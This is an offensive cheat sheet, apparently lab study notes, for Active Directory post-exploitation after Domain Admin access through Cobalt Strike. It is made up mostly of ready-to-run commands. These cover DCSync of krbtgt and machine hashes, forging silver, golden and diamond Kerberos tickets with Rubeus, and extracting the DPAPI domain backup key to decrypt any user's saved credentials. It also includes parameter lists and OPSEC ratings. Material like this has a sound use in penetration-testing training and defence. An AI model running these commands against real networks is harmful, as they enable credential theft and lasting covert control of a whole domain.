# Domain Domination - Post DA (Cobalt Strike)

Techniques for after obtaining Domain Admin privileges.

---

## DCSync

Requires Domain Admin, Enterprise Admin, or DC computer account.

```
# Impersonate DA
make_token INLANEFREIGHT\bjohnson Passw0rd!

# DCSync krbtgt hash
dcsync inlanefreight.local INLANEFREIGHT\krbtgt

# DCSync computer account (include $)
dcsync inlanefreight.local INLANEFREIGHT\ilf-db-1$
```

---

## Ticket Forgery

### Silver Tickets

Forged service ticket using service's secret. Targets specific service on specific machine.

**Use case:** Maintain local admin access after initial compromise by forging CIFS tickets.

```
# Get computer account hash via dcsync first
# Drop the RID from the SID

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/ilf-db-1 /aes256:<computer-aes256-hash> /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /nowrap
```

**Parameters:**
- `/service` - Target service (e.g., cifs/hostname, MSSQLSvc/hostname:1433)
- `/aes256` - AES256 hash of target computer/service account
- `/user` - Username to impersonate
- `/domain` - FQDN of domain
- `/sid` - Domain SID (without RID)
- `/id` - User RID (default: 500)
- `/groups` - Group RIDs (default: 520,512,513,519,518)

**Inject and use:**
```
make_token INLANEFREIGHT\Administrator FakePass
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64-ticket>
run klist
ls \\ilf-db-1\c$
rev2self
```

**Silver ticket for MSSQL (after Kerberoasting):**
```
# Convert plaintext password to hash
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:INLANEFREIGHT.LOCAL /password:Passw0rd!

# Forge ticket impersonating sysadmin user
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/ilf-db-1.inlanefreight.local:1433 /rc4:<rc4-hash> /user:tmorgan /id:1108 /groups:513,1106,1107,4602 /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /nowrap
```

> **Note:** Silver tickets can be mitigated by PAC validation. Ticket is signed with computer's secret instead of krbtgt, so KDC validation will fail.

---

### Golden Tickets

Forged TGT signed with krbtgt secret. Can impersonate any user to any service.

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt-aes256-hash> /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /nowrap
```

**Parameters:**
- `/aes256` - krbtgt AES256 hash
- `/user` - Username to impersonate
- `/domain` - Current domain
- `/sid` - Current domain SID

**Use golden ticket:**
```
make_token INLANEFREIGHT\Administrator FakePass
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64-ticket>
run klist 
ls \\ilf-dc-1\c$
```

---

### Diamond Tickets

More OPSEC-safe than golden tickets. Requests legitimate TGT, decrypts it with krbtgt secret, modifies internals, re-encrypts and re-signs.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt-aes256-hash> /ticketuser:Administrator /ticketuserid:500 /domain:INLANEFREIGHT.LOCAL /nowrap
```

**Parameters:**
- `/tgtdeleg` - Uses TGT delegation trick (no creds needed)
- `/krbkey` - krbtgt AES256 hash
- `/ticketuser` - User to impersonate
- `/ticketuserid` - Impersonated user's RID
- `/domain` - Current domain
- `/groups` - Group RIDs (default: 520,512,513,519,518)

**Use diamond ticket:**
```
make_token INLANEFREIGHT\Administrator FakePass
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64-ticket>
run klist 
ls \\ilf-dc-1\c$
```

---

## DPAPI Backup Key

Domain backup key can decrypt DPAPI blobs for **any user** in the domain. Never automatically changed.

### Extract Backup Key (Requires DA)

```
make_token INLANEFREIGHT\bjohnson Passw0rd!
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
```

**Output:**
```
[*] Preferred backupkey Guid         : 12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Key                              : HvG1s[...snip...]lXQns=
```

### Decrypt Other Users' Credentials

With local admin on a machine, decrypt any user's saved credentials:

```
# Enumerate credentials (will show MasterKey GUID not in cache)
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials

# Decrypt using domain backup key
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=
```

> **Note:** `/rpc` method only works for current user's credentials. Use `/pvk` with backup key for other users.

---

## Quick Reference - Ticket Types

| Ticket Type | Secret Required | Scope | OPSEC |
|-------------|-----------------|-------|-------|
| Silver | Service/Computer hash | Single service | Medium |
| Golden | krbtgt hash | Entire domain | Lower (forged offline) |
| Diamond | krbtgt hash | Entire domain | Higher (modifies real TGT) |
